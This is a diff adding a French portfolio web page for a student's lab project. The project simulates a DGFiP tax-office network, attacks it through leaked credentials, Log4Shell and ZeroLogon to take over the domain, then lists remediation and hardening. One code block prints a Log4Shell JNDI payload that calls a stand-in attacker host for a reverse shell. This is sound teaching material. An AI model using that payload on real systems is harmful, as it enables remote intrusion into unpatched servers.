@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Infrastructure DGFIP — Antoine Vernay</title>
+  <meta name="description" content="Simulation d'une infrastructure DGFIP avec exploitation Log4Shell, ZeroLogon et remédiation — projet cybersécurité d'Antoine Vernay." />
+  <link rel="stylesheet" href="style.css" />
+  <style>
+    /* ── Detail page specific ── */
+    .detail-hero {
+      padding: calc(var(--nav-h) + 64px) 0 64px;
+      position: relative;
+      overflow: hidden;
+    }
+    .detail-hero-blob {
+      position: absolute;
+      width: 700px; height: 400px;
+      border-radius: 50%;
+      background: radial-gradient(ellipse, rgba(245,158,11,.06) 0%, transparent 70%);
+      top: -60px; right: -200px;
+      pointer-events: none;
+    }
+    .detail-back {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 13px;
+      color: var(--muted-2);
+      text-decoration: none;
+      margin-bottom: 28px;
+      transition: color .2s;
+    }
+    .detail-back:hover { color: var(--text); }
+    .detail-meta {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      flex-wrap: wrap;
+      margin-bottom: 18px;
+    }
+    .detail-cat {
+      font-size: 10px;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      font-weight: 600;
+      color: #f59e0b;
+      padding: 3px 11px;
+      border: 1px solid rgba(245,158,11,.3);
+      border-radius: 3px;
+      background: rgba(245,158,11,.08);
+    }
+    .detail-year {
+      font-size: 12px;
+      color: var(--muted);
+    }
+    .detail-title {
+      font-family: var(--display);
+      font-size: clamp(32px, 4.5vw, 58px);
+      font-weight: 800;
+      line-height: 1.06;
+      letter-spacing: -2px;
+      margin-bottom: 20px;
+    }
+    .detail-title .amber { color: #f59e0b; }
+    .detail-subtitle {
+      font-size: 16px;
+      color: var(--muted-2);
+      line-height: 1.8;
+      max-width: 640px;
+      margin-bottom: 36px;
+    }
+    .detail-tags {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+    .detail-tag {
+      font-size: 12px;
+      padding: 5px 13px;
+      background: var(--bg-3);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      color: var(--muted-2);
+    }
+
+    /* ── Content layout ── */
+    .detail-body {
+      display: grid;
+      grid-template-columns: 1fr 280px;
+      gap: 56px;
+      align-items: start;
+      padding-bottom: 96px;
+    }
+    .detail-main { min-width: 0; }
+    .detail-sidebar { position: sticky; top: calc(var(--nav-h) + 24px); }
+
+    /* ── Section blocks ── */
+    .detail-section {
+      margin-bottom: 56px;
+    }
+    .detail-section-label {
+      font-size: 10px;
+      letter-spacing: 4px;
+      text-transform: uppercase;
+      color: var(--cyan);
+      font-weight: 600;
+      margin-bottom: 12px;
+    }
+    .detail-section-title {
+      font-family: var(--display);
+      font-size: 22px;
+      font-weight: 800;
+      letter-spacing: -.5px;
+      margin-bottom: 18px;
+      padding-bottom: 14px;
+      border-bottom: 1px solid var(--border);
+    }
+    .detail-text {
+      font-size: 14.5px;
+      color: var(--muted-2);
+      line-height: 1.85;
+      margin-bottom: 16px;
+    }
+    .detail-text strong { color: var(--text); font-weight: 600; }
+
+    /* ── Pillar cards ── */
+    .pillar-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 14px;
+      margin-top: 20px;
+    }
+    .pillar-card {
+      background: var(--bg-2);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 20px;
+      transition: border-color .25s, transform .25s;
+    }
+    .pillar-card:hover { border-color: rgba(245,158,11,.3); transform: translateY(-2px); }
+    .pillar-card-icon { font-size: 22px; margin-bottom: 10px; }
+    .pillar-card-title {
+      font-family: var(--display);
+      font-size: 15px;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+    .pillar-card-desc {
+      font-size: 13px;
+      color: var(--muted-2);
+      line-height: 1.7;
+    }
+    .pillar-card-tags { display: flex; flex-wrap: wrap; gap: 5px; margin-top: 10px; }
+    .pillar-card-tags span {
+      font-size: 11px;
+      padding: 2px 8px;
+      background: var(--bg-3);
+      border: 1px solid var(--border);
+      border-radius: 3px;
+      color: var(--muted);
+    }
+
+    /* ── Attack chain ── */
+    .chain-step {
+      display: grid;
+      grid-template-columns: 28px 1fr;
+      gap: 16px;
+      padding-bottom: 28px;
+      position: relative;
+    }
+    .chain-step:not(:last-child)::before {
+      content: '';
+      position: absolute;
+      left: 13px;
+      top: 30px;
+      bottom: 0;
+      width: 1px;
+      background: var(--border);
+    }
+    .chain-dot {
+      width: 28px; height: 28px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 11px;
+      font-weight: 700;
+      font-family: var(--display);
+      flex-shrink: 0;
+      border: 2px solid;
+    }
+    .chain-dot.phase-1 { background: rgba(251,146,60,.1); border-color: rgba(251,146,60,.5); color: #fb923c; }
+    .chain-dot.phase-2 { background: rgba(239,68,68,.1); border-color: rgba(239,68,68,.5); color: #ef4444; }
+    .chain-dot.phase-3 { background: rgba(167,139,250,.1); border-color: rgba(167,139,250,.5); color: #a78bfa; }
+    .chain-body {}
+    .chain-phase {
+      font-size: 10px;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      font-weight: 600;
+      margin-bottom: 4px;
+    }
+    .chain-phase.p1 { color: #fb923c; }
+    .chain-phase.p2 { color: #ef4444; }
+    .chain-phase.p3 { color: #a78bfa; }
+    .chain-title {
+      font-family: var(--display);
+      font-size: 16px;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+    .chain-desc {
+      font-size: 13.5px;
+      color: var(--muted-2);
+      line-height: 1.75;
+    }
+    .chain-desc strong { color: var(--text); }
+    .chain-cve {
+      display: inline-block;
+      font-size: 11px;
+      padding: 2px 9px;
+      border-radius: 3px;
+      font-weight: 600;
+      font-family: monospace;
+      letter-spacing: .5px;
+      margin-left: 6px;
+      vertical-align: middle;
+    }
+    .cve-orange { background: rgba(251,146,60,.12); border: 1px solid rgba(251,146,60,.3); color: #fb923c; }
+    .cve-red    { background: rgba(239,68,68,.12); border: 1px solid rgba(239,68,68,.3); color: #ef4444; }
+
+    /* ── Remediation ── */
+    .remed-card {
+      background: var(--bg-2);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 22px;
+      margin-bottom: 14px;
+      display: flex;
+      gap: 16px;
+      align-items: flex-start;
+      transition: border-color .2s;
+    }
+    .remed-card:hover { border-color: rgba(52,211,153,.3); }
+    .remed-icon {
+      width: 36px; height: 36px;
+      border-radius: 8px;
+      background: rgba(52,211,153,.1);
+      border: 1px solid rgba(52,211,153,.25);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 16px;
+      flex-shrink: 0;
+      color: #34d399;
+    }
+    .remed-label {
+      font-size: 10px;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      color: #34d399;
+      font-weight: 600;
+      margin-bottom: 4px;
+    }
+    .remed-title {
+      font-family: var(--display);
+      font-size: 15px;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+    .remed-desc {
+      font-size: 13px;
+      color: var(--muted-2);
+      line-height: 1.72;
+    }
+
+    /* ── Code block ── */
+    .code-block {
+      background: #0a0e14;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 18px 20px;
+      font-family: 'Courier New', monospace;
+      font-size: 13px;
+      color: #7dd3fc;
+      line-height: 1.6;
+      overflow-x: auto;
+      margin: 16px 0;
+    }
+    .code-block .cm { color: #4a5568; }
+    .code-block .kw { color: #f59e0b; }
+    .code-block .st { color: #34d399; }
+
+    /* ── Sidebar info box ── */
+    .sidebar-box {
+      background: var(--bg-2);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 20px;
+      margin-bottom: 14px;
+    }
+    .sidebar-box-title {
+      font-size: 10px;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      color: var(--muted);
+      font-weight: 600;
+      margin-bottom: 14px;
+    }
+    .sidebar-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 8px 0;
+      border-top: 1px solid var(--border);
+      font-size: 13px;
+    }
+    .sidebar-row:first-of-type { border-top: none; }
+    .sidebar-row-label { color: var(--muted); }
+    .sidebar-row-val { color: var(--text); font-weight: 500; }
+    .sidebar-row-val.amber { color: #f59e0b; }
+    .sidebar-row-val.green { color: #34d399; }
+    .sidebar-cve {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      margin-top: 4px;
+    }
+    .sidebar-cve-item {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size: 12px;
+    }
+    .sidebar-cve-id {
+      font-family: monospace;
+      font-weight: 600;
+      color: #fb923c;
+    }
+    .sidebar-cve-score {
+      font-size: 11px;
+      padding: 2px 7px;
+      border-radius: 3px;
+      font-weight: 600;
+    }
+    .score-critical { background: rgba(239,68,68,.12); color: #ef4444; border: 1px solid rgba(239,68,68,.25); }
+
+    @media (max-width: 860px) {
+      .detail-body { grid-template-columns: 1fr; }
+      .detail-sidebar { position: static; }
+      .pillar-grid { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ══ PAGE LOADER ══════════════════════════════ -->
+  <div id="page-loader">
+    <div class="loader-ring"></div>
+    <div class="loader-logo">AV<span>.</span></div>
+  </div>
+
+  <!-- ══ NAVBAR ══ -->
+  <nav class="navbar" id="navbar">
+    <a class="nav-logo" href="index.html">AV<span>.</span></a>
+    <ul class="nav-links">
+      <li><a href="index.html">Accueil</a></li>
+      <li><a href="index.html#about">À propos</a></li>
+      <li><a href="index.html#skills">Compétences</a></li>
+      <li><a href="index.html#parcours">Parcours</a></li>
+      <li><a href="projects.html" class="active">Projets</a></li>
+    </ul>
+    <a class="nav-cta" href="index.html#contact">Me contacter</a>
+    <button class="nav-burger" id="burger" aria-label="Menu">
+      <span></span><span></span><span></span>
+    </button>
+  </nav>
+
+  <!-- Mobile menu -->
+  <div class="nav-mobile" id="nav-mobile">
+    <a href="index.html">Accueil</a>
+    <a href="index.html#about">À propos</a>
+    <a href="index.html#skills">Compétences</a>
+    <a href="index.html#parcours">Parcours</a>
+    <a href="projects.html">Projets</a>
+    <a class="nav-cta" href="index.html#contact" style="align-self:flex-start">Me contacter</a>
+  </div>
+
+
+  <!-- ══ DETAIL HERO ══ -->
+  <div class="detail-hero">
+    <div class="detail-hero-blob"></div>
+    <div class="container">
+
+      <a class="detail-back" href="projects.html">← Retour aux projets</a>
+
+      <div class="detail-meta">
+        <span class="detail-cat">Cybersécurité</span>
+        <span class="detail-cat" style="color:#a78bfa;border-color:rgba(167,139,250,.3);background:rgba(167,139,250,.08)">Pentest</span>
+        <span class="detail-cat" style="color:#00d4ff;border-color:rgba(0,212,255,.3);background:var(--cyan-dim)">SAÉ IUT</span>
+        <span class="detail-year">2025</span>
+      </div>
+
+      <h1 class="detail-title">
+        Infrastructure <span class="amber">DGFIP</span><br>Simulation d'Infiltration
+      </h1>
+      <p class="detail-subtitle">
+        Déploiement d'une infrastructure simulant une antenne départementale de la DGFiP, puis exploitation d'une chaîne d'attaque complète — de la fuite d'informations à la compromission totale du domaine Active Directory.
+      </p>
+      <div class="detail-tags">
+        <span class="detail-tag">Apache Tomcat 9</span>
+        <span class="detail-tag">Log4Shell · CVE-2021-44228</span>
+        <span class="detail-tag">ZeroLogon · CVE-2020-1472</span>
+        <span class="detail-tag">Metasploit / Meterpreter</span>
+        <span class="detail-tag">Stormshield</span>
+        <span class="detail-tag">Splunk · Docker</span>
+        <span class="detail-tag">Active Directory</span>
+        <span class="detail-tag">Samba</span>
+        <span class="detail-tag">Bind9</span>
+        <span class="detail-tag">VPN SSL</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="divider"></div>
+
+
+  <!-- ══ DETAIL BODY ══ -->
+  <div class="container">
+    <div class="detail-body">
+
+      <!-- ── MAIN CONTENT ── -->
+      <main class="detail-main">
+
+        <!-- I. Architecture -->
+        <div class="detail-section reveal">
+          <p class="detail-section-label">I — Architecture</p>
+          <h2 class="detail-section-title">Services mis en place</h2>
+          <p class="detail-text">
+            L'infrastructure simule une <strong>antenne départementale de la DGFIP</strong>, articulée autour de quatre piliers technologiques déployés en environnement virtualisé avec segmentation réseau réelle (WAN / DMZ / LAN).
+          </p>
+
+          <div class="pillar-grid">
+            <div class="pillar-card">
+              <div class="pillar-card-icon">🖥</div>
+              <div class="pillar-card-title">Serveur Ubuntu Multi-Services</div>
+              <div class="pillar-card-desc">Zone DMZ — centralise les accès applicatifs et services réseau.</div>
+              <div class="pillar-card-tags">
+                <span>Apache Tomcat 9</span>
+                <span>Bind9</span>
+                <span>Samba</span>
+                <span>Portail impots.gouv</span>
+              </div>
+            </div>
+
+            <div class="pillar-card">
+              <div class="pillar-card-icon">🛡</div>
+              <div class="pillar-card-title">Pare-feu Stormshield</div>
+              <div class="pillar-card-desc">Cœur de réseau — segmentation WAN / LAN / DMZ, DHCP et VPN SSL.</div>
+              <div class="pillar-card-tags">
+                <span>NAT</span>
+                <span>DHCP 192.168.121.10–50</span>
+                <span>VPN SSL</span>
+                <span>Mode IDS</span>
+              </div>
+            </div>
+
+            <div class="pillar-card">
+              <div class="pillar-card-icon">🪟</div>
+              <div class="pillar-card-title">Windows Server — AD</div>
+              <div class="pillar-card-desc">Contrôleur de domaine <code style="font-size:12px;color:var(--cyan)">dgfip.local</code> — Active Directory, authentification SSO.</div>
+              <div class="pillar-card-tags">
+                <span>Active Directory</span>
+                <span>Domaine dgfip.local</span>
+                <span>Netlogon</span>
+              </div>
+            </div>
+
+            <div class="pillar-card">
+              <div class="pillar-card-icon">📊</div>
+              <div class="pillar-card-title">Splunk (Docker)</div>
+              <div class="pillar-card-desc">SIEM — indexe tous les événements critiques de l'infrastructure.</div>
+              <div class="pillar-card-tags">
+                <span>Logs SSH</span>
+                <span>Accès Samba</span>
+                <span>Erreurs Java Tomcat</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- II. Scénario d'Infiltration -->
+        <div class="detail-section reveal" data-delay="0.1">
+          <p class="detail-section-label">II — Scénario</p>
+          <h2 class="detail-section-title">Chaîne d'attaque exploitée</h2>
+          <p class="detail-text">
+            L'attaque exploite une <strong>succession d'erreurs humaines et de vulnérabilités critiques</strong>, simulant un scénario réaliste d'intrusion ciblée sur une infrastructure gouvernementale.
+          </p>
+
+          <!-- Phase 1 -->
+          <div class="chain-step">
+            <div class="chain-dot phase-1">01</div>
+            <div class="chain-body">
+              <div class="chain-phase p1">Phase 1 — Accès initial</div>
+              <div class="chain-title">Fuite d'informations &amp; accès Samba</div>
+              <div class="chain-desc">
+                <strong>Erreur humaine :</strong> un technicien a laissé des identifiants (<code style="color:#f59e0b">antoine / dgfip</code>) encodés en Base64 dans les commentaires HTML de la page de connexion du portail web.<br><br>
+                <strong>Exposition Samba :</strong> une règle de NAT mal configurée sur le Stormshield expose le partage Samba (normalement interne) sur le WAN. L'attaquant récupère :
+                <ul style="margin-top:8px;padding-left:18px;list-style:disc;color:var(--muted-2)">
+                  <li>Un mail interne alertant sur la faille Log4Shell</li>
+                  <li>Un plan réseau détaillé de l'infrastructure</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+
+          <!-- Phase 2 -->
+          <div class="chain-step">
+            <div class="chain-dot phase-2">02</div>
+            <div class="chain-body">
+              <div class="chain-phase p2">Phase 2 — Compromission du serveur web</div>
+              <div class="chain-title">Log4Shell <span class="chain-cve cve-red">CVE-2021-44228</span></div>
+              <div class="chain-desc">
+                Le serveur Tomcat utilise <strong>Log4j v2.14.1</strong>, vulnérable à l'exécution de code à distance par injection JNDI. L'attaquant injecte la payload dans le champ "Numéro fiscal" du portail :<br>
+              </div>
+              <div class="code-block"><span class="cm">// Payload injectée dans le formulaire</span>
+<span class="kw">${</span>jndi:rmi://<span class="st">attacker.server:1099</span>/shell<span class="kw">}</span>
+
+<span class="cm">// Résultat : reverse shell sur le serveur Ubuntu DMZ</span>
+<span class="cm">// Le Stormshield en mode IDS laisse passer le flux (détecte mais ne bloque pas)</span></div>
+              <div class="chain-desc">Résultat : <strong>contrôle total du serveur Ubuntu</strong> en DMZ via un reverse shell.</div>
+            </div>
+          </div>
+
+          <!-- Phase 3 -->
+          <div class="chain-step">
+            <div class="chain-dot phase-3">03</div>
+            <div class="chain-body">
+              <div class="chain-phase p3">Phase 3 — Pivot &amp; compromission du domaine</div>
+              <div class="chain-title">ZeroLogon <span class="chain-cve" style="background:rgba(167,139,250,.12);border-color:rgba(167,139,250,.3);color:#a78bfa">CVE-2020-1472</span></div>
+              <div class="chain-desc">
+                Via <strong>Metasploit + Meterpreter</strong>, le serveur web compromis est transformé en tunnel pour atteindre le LAN (normalement invisible depuis l'extérieur).<br><br>
+                L'attaquant cible le contrôleur de domaine Windows Server (<code style="color:#a78bfa">192.168.121.9</code>) via ZeroLogon — faille critique dans le protocole Netlogon permettant de réinitialiser le mot de passe machine sans authentification préalable :<br>
+              </div>
+              <div class="chain-desc" style="margin-top:10px">
+                <strong>Impact :</strong>
+                <ul style="margin-top:8px;padding-left:18px;list-style:disc;color:var(--muted-2)">
+                  <li>Réinitialisation du mot de passe de l'ordinateur du domaine</li>
+                  <li>Dump de la base NTDS.dit (hashs NTLM de tous les comptes)</li>
+                  <li>Élévation en <strong>Administrateur du Domaine</strong></li>
+                  <li>Accès total aux dossiers fiscaux et postes de travail</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- III. Remédiation -->
+        <div class="detail-section reveal" data-delay="0.2">
+          <p class="detail-section-label">III — Remédiation</p>
+          <h2 class="detail-section-title">Mesures correctives appliquées</h2>
+
+          <div class="remed-card">
+            <div class="remed-icon">⚡</div>
+            <div>
+              <div class="remed-label">Log4Shell — CVE-2021-44228</div>
+              <div class="remed-title">Neutralisation immédiate de l'interprétation JNDI</div>
+              <div class="remed-desc">
+                Ajout de l'option JVM dans <code style="color:var(--cyan)">JAVA_OPTS</code> pour bloquer l'interprétation des lookups JNDI dès le démarrage de Tomcat :<br>
+                <code style="display:inline-block;margin-top:8px;background:#0a0e14;padding:5px 10px;border-radius:4px;font-size:12px;color:#f59e0b">-Dlog4j2.formatMsgNoLookups=true</code><br><br>
+                <strong>Action définitive :</strong> remplacement de tous les fichiers JAR de Log4j vulnérables par la version sécurisée <strong>2.17.1</strong>.
+              </div>
+            </div>
+          </div>
+
+          <div class="remed-card">
+            <div class="remed-icon">🛡</div>
+            <div>
+              <div class="remed-label">ZeroLogon — CVE-2020-1472</div>
+              <div class="remed-title">Correction Windows Server &amp; sécurisation Netlogon</div>
+              <div class="remed-desc">
+                Installation des <strong>mises à jour cumulatives Microsoft</strong> (Knowledge Base) corrigeant la vulnérabilité Netlogon.<br><br>
+                <strong>Sécurisation renforcée :</strong> forçage via GPO de l'utilisation exclusive des canaux Netlogon sécurisés (<em>Enforce Secure Channel</em>) pour toutes les communications machine-contrôleur de domaine.
+              </div>
+            </div>
+          </div>
+
+          <div class="remed-card">
+            <div class="remed-icon">◈</div>
+            <div>
+              <div class="remed-label">Hardening général</div>
+              <div class="remed-title">Autres mesures préventives recommandées</div>
+              <div class="remed-desc">
+                <ul style="padding-left:18px;list-style:disc;color:var(--muted-2);line-height:1.9">
+                  <li>Suppression des commentaires sensibles du code HTML (credentials)</li>
+                  <li>Correction des règles NAT Stormshield — isolation effective du partage Samba</li>
+                  <li>Passage du Stormshield en mode <strong>IPS actif</strong> (blocage, non seulement détection)</li>
+                  <li>Segmentation stricte DMZ → LAN : interdire les connexions depuis un serveur compromis</li>
+                  <li>Mise en place d'alertes Splunk sur les tentatives d'injection JNDI et les authentifications Netlogon anormales</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </main>
+
+      <!-- ── SIDEBAR ── -->
+      <aside class="detail-sidebar">
+
+        <div class="sidebar-box">
+          <div class="sidebar-box-title">Informations projet</div>
+          <div class="sidebar-row">
+            <span class="sidebar-row-label">Contexte</span>
+            <span class="sidebar-row-val">SAÉ IUT Roanne</span>
+          </div>
+          <div class="sidebar-row">
+            <span class="sidebar-row-label">Année</span>
+            <span class="sidebar-row-val">2025</span>
+          </div>
+          <div class="sidebar-row">
+            <span class="sidebar-row-label">Type</span>
+            <span class="sidebar-row-val amber">Red &amp; Blue Team</span>
+          </div>
+          <div class="sidebar-row">
+            <span class="sidebar-row-label">Environnement</span>
+            <span class="sidebar-row-val">Virtualisé (VMware)</span>
+          </div>
+          <div class="sidebar-row">
+            <span class="sidebar-row-label">Domaine</span>
+            <span class="sidebar-row-val">dgfip.local</span>
+          </div>
+        </div>
+
+        <div class="sidebar-box">
+          <div class="sidebar-box-title">CVE exploitées</div>
+          <div class="sidebar-cve">
+            <div class="sidebar-cve-item">
+              <span class="sidebar-cve-id">CVE-2021-44228</span>
+              <span class="sidebar-cve-score score-critical">10.0 CRITIQUE</span>
+            </div>
+            <div style="font-size:12px;color:var(--muted);line-height:1.6;margin-bottom:4px">Log4Shell — Log4j RCE via injection JNDI</div>
+            <div class="sidebar-cve-item">
+              <span class="sidebar-cve-id">CVE-2020-1472</span>
+              <span class="sidebar-cve-score score-critical">10.0 CRITIQUE</span>
+            </div>
+            <div style="font-size:12px;color:var(--muted);line-height:1.6">ZeroLogon — Netlogon privilege escalation</div>
+          </div>
+        </div>
+
+        <div class="sidebar-box">
+          <div class="sidebar-box-title">Stack technique</div>
+          <div style="display:flex;flex-wrap:wrap;gap:6px;margin-top:4px">
+            <span class="detail-tag" style="padding:3px 10px">Metasploit</span>
+            <span class="detail-tag" style="padding:3px 10px">Meterpreter</span>
+            <span class="detail-tag" style="padding:3px 10px">Stormshield SNS</span>
+            <span class="detail-tag" style="padding:3px 10px">Splunk</span>
+            <span class="detail-tag" style="padding:3px 10px">Docker</span>
+            <span class="detail-tag" style="padding:3px 10px">Apache Tomcat</span>
+            <span class="detail-tag" style="padding:3px 10px">Bind9</span>
+            <span class="detail-tag" style="padding:3px 10px">Samba</span>
+            <span class="detail-tag" style="padding:3px 10px">Active Directory</span>
+            <span class="detail-tag" style="padding:3px 10px">Windows Server</span>
+            <span class="detail-tag" style="padding:3px 10px">Ubuntu Server</span>
+          </div>
+        </div>
+
+        <a class="btn-ghost" href="projects.html" style="width:100%;justify-content:center;text-align:center;margin-top:6px">← Tous les projets</a>
+
+      </aside>
+
+    </div>
+  </div>
+
+
+  <!-- ══ FOOTER ══ -->
+  <footer>
+    <div class="footer-logo">Antoine<span>.</span></div>
+    <span>Roanne / Bron · 2026</span>
+    <div class="footer-links">
+      <a href="index.html">Accueil</a>
+      <a href="projects.html">Projets</a>
+      <a href="index.html#contact">Contact</a>
+    </div>
+  </footer>
+
+  <script src="main.js"></script>
+</body>
+</html>
